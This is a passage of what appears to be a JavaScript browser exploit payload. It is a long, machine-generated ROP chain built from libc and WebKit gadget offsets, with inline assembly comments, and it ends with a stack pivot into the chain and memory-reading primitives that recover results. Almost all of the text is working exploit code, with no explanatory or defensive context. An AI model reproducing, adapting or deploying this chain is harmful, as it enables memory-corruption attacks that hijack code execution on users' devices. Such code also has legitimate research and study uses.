libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967080, 4294967295]); // -0xd8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([200, 0]); // 0xc8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967088, 4294967295]); // -0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([192, 0]); // 0xc0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967096, 4294967295]); // -0xc8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([184, 0]); // 0xb8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967104, 4294967295]); // -0xc0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([176, 0]); // 0xb0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+792472 //pop rcx
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
webkit_base+5202439, //and rax, rcx
libc_base+793877 //pop rsi
]);
db([4294967216, 4294967295]); // -0x50
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+547950, //mov rcx, [rdi + 0x18] ; lea rax, [rax + rcx - 1]
libc_base+877175, //sub rax, rcx ; sbb rdx, rcx
libc_base+793877 //pop rsi
]);
db([1, 0]); // 0x1
set_gadgets([
libc_base+547636, //add rax, rsi
webkit_base+2997875, //mov [rax], rcx
libc_base+793877 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877 //pop rsi
]);
db([48, 0]); // 0x30
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+759626, //mov rax, r8
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([32, 0]); // 0x20
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877 //pop rsi
]);
db([24, 0]); // 0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([128, 0]); // 0x80
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+218712, //L3464
webkit_base+7438103, //mov [rsi], rax
libc_base+811575 //pop rsp
]);
//L3464:
db([0, 0]); // 0x0
//L3324:
set_gadget(libc_base+793877,); //pop rsi
db([208, 0]); // 0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+206806, //pop rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+793877, //pop rsi
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+105267, //pop rdx
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+792472, //pop rcx
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+432898, //pop r8
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+10235455, //pop r9
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+785193, //xor rax, rax
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+11, //nop
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+11, //nop
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+793877, //pop rsi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+7438103, //mov [rsi], rax
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+792472, //pop rcx
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+206806, //pop rdi
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+432898, //pop r8
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+811575, //pop rsp
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([208, 0]); // 0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967080, 4294967295]); // -0xd8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([200, 0]); // 0xc8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967088, 4294967295]); // -0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([192, 0]); // 0xc0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967096, 4294967295]); // -0xc8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([184, 0]); // 0xb8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967104, 4294967295]); // -0xc0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([176, 0]); // 0xb0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967112, 4294967295]); // -0xb8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([168, 0]); // 0xa8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+792472 //pop rcx
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
webkit_base+5202439, //and rax, rcx
libc_base+792472, //pop rcx
read_addr,
webkit_base+2997875, //mov [rax], rcx
libc_base+793877 //pop rsi
]);
db([4294967192, 4294967295]); // -0x68
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877 //pop rsi
]);
db([48, 0]); // 0x30
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+759626, //mov rax, r8
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([32, 0]); // 0x20
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877 //pop rsi
]);
db([24, 0]); // 0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([128, 0]); // 0x80
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+220040, //L3465
webkit_base+7438103, //mov [rsi], rax
libc_base+811575 //pop rsp
]);
//L3465:
db([0, 0]); // 0x0
//L2640:
db([5, 0, 0, 0, 0, 0]);
pivot(ropchain);
var main_ret = read_ptr_at(main_ret);
var printf_buf_end = read_ptr_at(ropchain+printf_buf_offset);
var printf_ans = read_mem_as_string(printf_buf, printf_buf_end-printf_buf);
var _ = malloc_nogc.pop();
var _ = malloc_nogc.pop();
var _ = malloc_nogc.pop();
